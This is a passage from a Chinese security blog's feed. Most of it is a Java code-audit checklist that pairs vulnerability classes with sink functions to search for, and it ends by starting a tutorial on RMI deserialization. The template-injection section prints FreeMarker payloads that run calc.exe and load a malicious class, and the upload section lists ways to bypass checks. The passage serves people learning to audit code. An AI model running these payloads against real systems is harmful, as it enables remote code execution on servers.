class="line">org.apache.http.client.methods.HttpRequestBase</span><br></pre></td></tr></table></figure><p>除了建立HTTP协议连接，还可能直接通过 Socket建立连接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AsynchronousServerSocketChannel.accept/bind</span><br><span class="line">AsynchronousSocketChannel.write/read/bind/connect</span><br><span class="line">ServerSocketChannel.bind</span><br><span class="line">ServerSocket.accept/bind</span><br><span class="line">Socket.bind/connect</span><br><span class="line">Socket.getInputStream().read</span><br><span class="line">Socket.getOutputStream().write</span><br><span class="line">SocketChannel.bind/read/write/connect</span><br></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>审计的注意点</p><ul><li>关注文件后缀验证，是使用白名单还是黑名单。</li><li>最好使用<code>lastIndexOf()</code>方法获取文件后缀，如果使用<code>IndexOf()</code>可能被绕过。</li><li>如果是白名单验证时，使用<code>toLowerCase()</code>处理再进行对比，或使用<code>equalsIgnoreCase()</code>，避免被大小写绕过。</li><li>是否校验了文件的大小。</li><li>是否校验了文件类型<code>getContentType()</code>。</li><li>对于使用Hutool的FileTypeUtil的<code>getType()</code>或<code>ImageIO.read()</code>通过读取文件流中前N个byte值来判断文件类型的，也可以使用类似图片马的方式进行绕过。</li><li>尝试”%00”截断能否绕过。</li><li>QP编码特性能否绕过。<code>javax.mail.internet.MimeUtility.encodeWord()</code>方法。</li><li>有一些安全校验的顺序有问题，先将文件保存，再进行安全检测，如果不通过检测则进行删除，此时可以在文件保存后触发报错终止流程，导致不删除文件。</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">FileUpload</span><br><span class="line">FileUploadBase</span><br><span class="line">FileItemIteratorImpl</span><br><span class="line">FileItemStreamImpl</span><br><span class="line">FileUtils</span><br><span class="line">UploadHandleServlet</span><br><span class="line">FileLoadServlet</span><br><span class="line">FileOutputStream</span><br><span class="line">DiskFileItemFactory</span><br><span class="line">MultipartRequestEntity</span><br><span class="line">MultipartFile</span><br><span class="line">com.oreilly.servlet.MultipartRequest</span><br><span class="line">java.io.File</span><br><span class="line">MultipartMethod</span><br><span class="line">MultipartHttpServletRequest</span><br><span class="line">CommonsMutipartResolver</span><br><span class="line">upload</span><br><span class="line">fileNmae</span><br><span class="line">filePath</span><br><span class="line">lastIndexOf</span><br><span class="line">indexOf</span><br><span class="line">FileUpload</span><br><span class="line">getRealPath</span><br><span class="line">getServletPath</span><br><span class="line">getPathInfo</span><br><span class="line">getContentType</span><br><span class="line">equalsIgnoreCase</span><br><span class="line">FileUtils</span><br><span class="line">UploadHandleServlet</span><br><span class="line">FileLoadServlet</span><br><span class="line">getInputStream</span><br><span class="line">DiskFileItemFactory</span><br><span class="line">file.getInputStream()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>(factory)</span><br><span class="line">handleFileUpload(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span><br></pre></td></tr></table></figure><h4 id="任意文件读-x2F-写-x2F-删除-x2F-复制-x2F-移动-x2F-遍历"><a href="#任意文件读-x2F-写-x2F-删除-x2F-复制-x2F-移动-x2F-遍历" class="headerlink" title="任意文件读&#x2F;写&#x2F;删除&#x2F;复制&#x2F;移动&#x2F;遍历"></a>任意文件读&#x2F;写&#x2F;删除&#x2F;复制&#x2F;移动&#x2F;遍历</h4><p>审计的注意点</p><ul><li>首先关注包含这些功能的类和函数</li><li>对传入的路径未做严格的校验，导致攻击者可以自定义路径</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sun.nio.ch.FileChannelImpl</span><br><span class="line">java.io.File.list/listFiles</span><br><span class="line">java.io.FileInputStream</span><br><span class="line">java.io.FileOutputStream</span><br><span class="line">java.io.FileSystem/Win32FileSystem/WinNTFileSystem/UnixFileSystem</span><br><span class="line">sun.nio.fs.UnixFileSystemProvider/WindowsFileSystemProvider</span><br><span class="line">java.io.RandomAccessFile</span><br><span class="line">sun.nio.fs.CopyFile</span><br><span class="line">sun.nio.fs.UnixChannelFactory</span><br><span class="line">sun.nio.fs.WindowsChannelFactory</span><br><span class="line">java.nio.channels.AsynchronousFileChannel</span><br><span class="line">FileUtil/IOUtil</span><br><span class="line">filePath/download/deleteFile/move/getFile</span><br><span class="line">fileName/filePath</span><br></pre></td></tr></table></figure><h4 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a>URL跳转</h4><p>审计的注意点</p><ul><li>用户登录、统一身份认证处，认证完了会通过url&#x3D;的形式跳转到类似操作的页面。</li><li>用户分享、收藏内容后跳转。</li><li>跨域认证授权后进行跳转。</li><li>对于URL跳转漏洞在黑盒测试时主要的关注点为：注意URL中是否带有return、redirect、url、jump、goto、target、link等 参数值，并注意观察后跟的URL地址的具体格式，再构造相应的payload尝试跳转。在白盒审计中我们则会重点关注可以进行URL跳转的相关方法。</li><li>定位可能存在redirect业务的代码段，审计跳转的URL是否来自于前端参数，是否具有校验和限制。</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sendRedirect</span><br><span class="line">setHeader</span><br><span class="line">forward</span><br><span class="line">redirect:</span><br><span class="line">&lt;c:redirect</span><br><span class="line">self.location.href</span><br><span class="line">location.href</span><br><span class="line">windows.location.href</span><br><span class="line">redirect、redirect_do、redirect_url、url、jump、jump_to、target、to、link、domain</span><br></pre></td></tr></table></figure><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>审计的注意点</p><ul><li>重点审计系统使用的框架、组件，根据经验查看配置，配置是否有误、是否将调试功能正式上线到生产环境中等。</li><li>由于配置不当或使用有误，将可能导致泄露服务器的敏感信息。<br>例如：swagger 接口文档、Hystrix 监控面板、DWR 框架、Actuator、druid监控平台等等。</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SwaggerConfig </span><br><span class="line">Swagger2Config </span><br><span class="line"><span class="meta">@EnableSwaggerBootstrapUI</span></span><br><span class="line"><span class="meta">@EnableSwagger2</span></span><br><span class="line">application.properties或者application.yml：swagger.production=<span class="literal">true</span>或swagger.basic.enable=<span class="literal">true</span></span><br><span class="line">Hystrix</span><br><span class="line">spring.datasource.druid.stat-view-servlet.enabled=<span class="literal">false</span>（<span class="literal">false</span>禁用，<span class="literal">true</span>开启）</span><br><span class="line">spring.datasource.druid.stat-view-servlet.enabled=<span class="literal">true</span></span><br><span class="line">spring.datasource.druid.stat-view-servlet.login-username=</span><br><span class="line">spring.datasource.druid.stat-view-servlet.login-password=</span><br><span class="line">endpoints.enabled = <span class="literal">false</span></span><br><span class="line">endpoints:</span><br><span class="line">management:</span><br></pre></td></tr></table></figure><h4 id="代码执行-x2F-表达式执行"><a href="#代码执行-x2F-表达式执行" class="headerlink" title="代码执行&#x2F;表达式执行"></a>代码执行&#x2F;表达式执行</h4><p>审计的注意点</p><ul><li>重点审计具有加载类、反序列化类、对类字节码进行操作的功能和代码</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">eval</span><br><span class="line">classLoader</span><br><span class="line">$$BCEL$$</span><br><span class="line">ServiceLoader</span><br><span class="line">ToolProvider.getSystemJavaCompiler()</span><br><span class="line">getSystemClassLoader</span><br><span class="line">JavaFileObject</span><br><span class="line">JdbcRowSetImpl</span><br><span class="line">TemplatesImpl</span><br><span class="line">TransformerFactoryImpl</span><br><span class="line">resolveClass</span><br><span class="line">loadClass</span><br><span class="line">javax.el.ELProcessor</span><br><span class="line">SpelExpressionParser</span><br><span class="line">org.springframework.expression.spel.standard</span><br><span class="line">parseExpression</span><br><span class="line">expression.getValue()</span><br><span class="line">expression.setValue()</span><br></pre></td></tr></table></figure><h4 id="Zip文件提取"><a href="#Zip文件提取" class="headerlink" title="Zip文件提取"></a>Zip文件提取</h4><p>审计的注意点</p><ul><li>重点主要关注应用是否存在ZIP解压缩功能</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream</span><br><span class="line">ZipInputStream</span><br><span class="line"><span class="title function_">getSize</span><span class="params">()</span></span><br><span class="line">ZipEntry</span><br></pre></td></tr></table></figure><h4 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 用户登陆、用户注册、找回密码等功能中密码信息未采用加密算法。</span><br><span class="line">2. 用户登陆、用户注册、找回密码等功能中`未采用验证码`或`验证码未做安全刷新`(未刷新Session中验证码的值)导致的撞库、密码爆破漏洞。</span><br><span class="line">3. 找回密码逻辑问题(如:可直接跳过验证逻辑直接发包修改)。</span><br><span class="line">4. 手机、邮箱验证、找回密码等涉及到动态验证码`未限制验证码失败次数`、`验证码有效期`、`验证码长度过短`导致的验证码爆破问题。</span><br><span class="line">5. 充值、付款等功能调用了第三方支付系统未正确校验接口(与第三方的交互、与客户的交互，主要查看逻辑问题)。</span><br><span class="line">6. 后端采用了`ORM框架`更新操作时因处理不当导致可以更新用户表任意字段(如:用户注册、用户个人资料修改时可以`直接创建管理员账号`或其他越权修改操作)。</span><br><span class="line">7. 后端采用了`ORM框架`查询数据时因处理不当导致可以接收任何参数导致的越权查询、敏感信息查询等安全问题。</span><br><span class="line">8. 用户中心转账、修改个人资料、密码、退出登陆等功能未采用验证码或`Token机制`导致存在`CSRF漏洞`。</span><br><span class="line">9. 后端服务过于信任前端，重要的参数和业务逻辑只做了前端验证(如:文件上传功能的文件类型只在JS中验证、后端不从Session中获取用户ID、用户名而是直接接收客户端请求的参数导致的`越权问题`)。</span><br><span class="line">10. 用户身份信息认证逻辑问题(如:后台系统自动登陆时直接读取Cookie中的用户名、用户权限不做验证)。</span><br><span class="line">11. 重要接口采用`ID自增、ID可预测并且云端未验证参数有效性`导致的越权访问、信息泄漏问题(如:任意用户订单越权访问)。</span><br><span class="line">12. `条件竞争问题`，某些关键业务(如:用户转账)不支持并发、分布式部署时不支持锁的操作等。</span><br><span class="line">13. 重要接口`未限制请求频率`，导致短信、邮件、电话、私信等信息轰炸。</span><br><span class="line">14. 敏感信息未保护，如`Cookie中直接存储用户密码等重要信息`，跟踪cookie中的变量最终到了哪。</span><br><span class="line">15. 弱加密算法、弱密钥，如勿把Base64当成数据加密方式、重要算法密钥采用弱口令如`123456`。</span><br><span class="line">16. 后端无异常处理机制、未自定义50X错误页面,服务器异常导致敏感信息泄漏(如:数据库信息、网站绝对路径等)。</span><br><span class="line">17. 使用`DWR框架`开发时前后端不分漏洞(如:DWR直接调用数据库信息把用户登陆逻辑直接放到了前端来做)。</span><br></pre></td></tr></table></figure><h4 id="硬编码"><a href="#硬编码" class="headerlink" title="硬编码"></a>硬编码</h4><p>审计的注意点</p><ul><li>审计源代码中是否有硬编码敏感信息。</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">password</span><br><span class="line">pass</span><br><span class="line">jdbc</span><br><span class="line">auth</span><br><span class="line">key</span><br></pre></td></tr></table></figure><h4 id="不安全的反射"><a href="#不安全的反射" class="headerlink" title="不安全的反射"></a>不安全的反射</h4><p>审计的注意点</p><ul><li>查看开发人员是否对反射调用方法、反射创建类实例进行了封装，并是否在对外的接口中进行了相关的调用。</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class.forName</span><br><span class="line">Method.invoke</span><br><span class="line">newInstance</span><br><span class="line">Worker/Invoker</span><br></pre></td></tr></table></figure><h4 id="使用了不安全的组件"><a href="#使用了不安全的组件" class="headerlink" title="使用了不安全的组件"></a>使用了不安全的组件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">组件例如 fastjson、jackson、xstream、shiro、xxl-job，框架例如 struts2、spring 等等，都要注意使用的版本问题。</span><br></pre></td></tr></table></figure><h4 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h4><ol><li>内建函数的利用：虽然FreeMarker中预制了大量的内建函数，极大地增强和拓展了模板的语言功能，但也可能引发一些危险操作。若研发人员不加以限制， 则很可能产生安全隐患。</li><li>new函数的利用：new函数可以创建一个继承自freemarker.template.TemplateModel 类的实例，查阅源码会发现freemarker.template.utility.Execute#exec可以执行 任意代码，因此可以通过new函数实例化一个Execute对象并执行exec() 方法造成任意代码被执行。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectConstructor：&lt;#assign value=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;Java.lang. ProcessBuilder&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>).start()&#125;</span><br><span class="line"></span><br><span class="line">JythonRuntime：&lt;#assign value=<span class="string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="keyword">new</span>()&gt;&lt;<span class="meta">@value</span>&gt;<span class="keyword">import</span> os;os. system(<span class="string">&quot;calc.exe&quot;</span>)&lt;/<span class="meta">@value</span>&gt;</span><br><span class="line"></span><br><span class="line">Execute：&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>api函数的利用：api函数可以用来访问Java API，使用方法为value?api.someJavaMethod()，相当于value.someJavaMethod()。因此可以利用api函数通过 getClassLoader来获取一个类加载器，进而加载恶意类。也可以通过getResource来读取服务器上的资源文件。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classLoader=object?api.class.getClassLoader()&gt;</span><br><span class="line">$&#123;classLoader.loadClass(<span class="string">&quot;Evil.class&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>审计的注意点</p><ul><li>一些增删改查方法，是否进行<code>Referer头检验</code>、<code>token检验</code> <code>无法构造的随机数参数</code>、<code>验证码密码</code></li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[<span class="string">&quot;token&quot;</span>]</span><br></pre></td></tr></table></figure><h4 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h4><p>审计的注意点</p><ul><li>在每个<code>request.getParameter(&quot;userid&quot;);</code>之后查看是否有检验当前用户与要进行增删改查的用户。</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.getParameter(<span class="string">&quot;userid&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>审计的注意点</p><ul><li>关注jsp是否存在文件包含的方法</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">本地文件包含：</span><br><span class="line">&lt;jsp:include page=<span class="string">&quot;&lt;%=file%&gt;&quot;</span>&gt;&lt;/jsp:include&gt;</span><br><span class="line">&lt;jsp:<span class="type">include</span> <span class="variable">page</span> <span class="operator">=</span><span class="string">&quot;&lt;%=file%&gt;&quot;</span>/&gt;</span><br><span class="line">远程文件包含：</span><br><span class="line">&lt;c:<span class="keyword">import</span> url=<span class="string">&quot;&lt;%= url%&gt;&quot;</span>&gt;&lt;/c:<span class="keyword">import</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="XMLDecoder反序列化"><a href="#XMLDecoder反序列化" class="headerlink" title="XMLDecoder反序列化"></a>XMLDecoder反序列化</h4><p>审计注意点</p><ul><li>观察传入XMLDecoder()的参数是否可控</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XMLDecoder</span> <span class="variable">decoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(ins);</span><br><span class="line">deocder.readObject()</span><br></pre></td></tr></table></figure><h4 id="BeanShell-RCE"><a href="#BeanShell-RCE" class="headerlink" title="BeanShell RCE"></a>BeanShell RCE</h4><p>审计注意点</p><ul><li>查找参数是否可控</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Interpreter</span> <span class="variable">interpreter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Interpreter</span>();</span><br><span class="line">Interpreter.eval(evalString)</span><br></pre></td></tr></table></figure><h4 id="SnakeYaml反序列化"><a href="#SnakeYaml反序列化" class="headerlink" title="SnakeYaml反序列化"></a>SnakeYaml反序列化</h4><p>审计注意点</p><ul><li>直接定位<code>yaml.load()</code>，然后进行回溯，查看下参数是否可控</li></ul><p>关键函数或字符串查找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>()</span><br><span class="line">yaml.load()</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://su18.org/post/code-audit/">https://su18.org/post/code-audit/</a></p><p><a href="https://github.com/Cryin/JavaID">https://github.com/Cryin/JavaID</a></p><p><a href="https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/">https://shu1l.github.io/2021/01/27/java-dai-ma-shen-ji-zhi-chang-jian-lou-dong-xue-xi/</a></p><p>《网络安全JAVA代码审计实战》</p><p>《JAVA代码审计入门篇》</p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;整理下平时Java代码审计中常见的一些漏洞学习总结以及一些审计思路，后续会不断补充。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="https://kpa1on.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="代码审计" scheme="https://kpa1on.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之RMI反序列化</title>
    <link href="https://kpa1on.github.io/2022/06/16/Java%E5%AE%89%E5%85%A8%E4%B9%8BRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://kpa1on.github.io/2022/06/16/Java%E5%AE%89%E5%85%A8%E4%B9%8BRMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-06-16T10:31:20.000Z</published>
    <updated>2022-06-16T14:36:27.695Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p> Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。</p><span id="more"></span><p>RMI可分为三大部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Server: 提供远程的对象</span><br><span class="line">Client:调用远程的对象</span><br><span class="line">Registry:一个注册表，存放着远程对象的位置（ip、端口、标识符）</span><br></pre></td></tr></table></figure><h3 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h3><ol><li>编写远程服务接口，该接口必须继承 java.rmi.Remote 接口，方法必须抛出java.rmi.RemoteException 异常；</li><li>编写远程接口实现类，该实现类必须继承 java.rmi.server.UnicastRemoteObject 类；</li><li>创建服务器实例，并且创建一个注册表，将需要提供给客户端的对象注册到注册到注册表中；</li><li>编写客户端并且调用远程对象；</li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>1、创建远程接口，继承java.rmi.Remote接口，并且修饰符需要为<code>public</code>否则远程调用的时候会报错，并且定义的方法里面需要抛出一个<code>RemoteException</code>的异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、实现远程接口，继承 java.rmi.server.UnicastRemoteObject类 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMIServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、创建服务器实例，并且创建一个注册表，将需要提供给客户端的对象注册到注册到注册表中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RMIInterface</span> <span class="variable">rmiService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIServiceImpl</span>();<span class="comment">//创建远程对象</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建注册表</span></span><br><span class="line">        registry.bind(<span class="string">&quot;rmiService&quot;</span>, rmiService);<span class="comment">//将远程对象绑定到注册表里，并且设置为rmiService</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4、编写客户端并且调用远程对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title 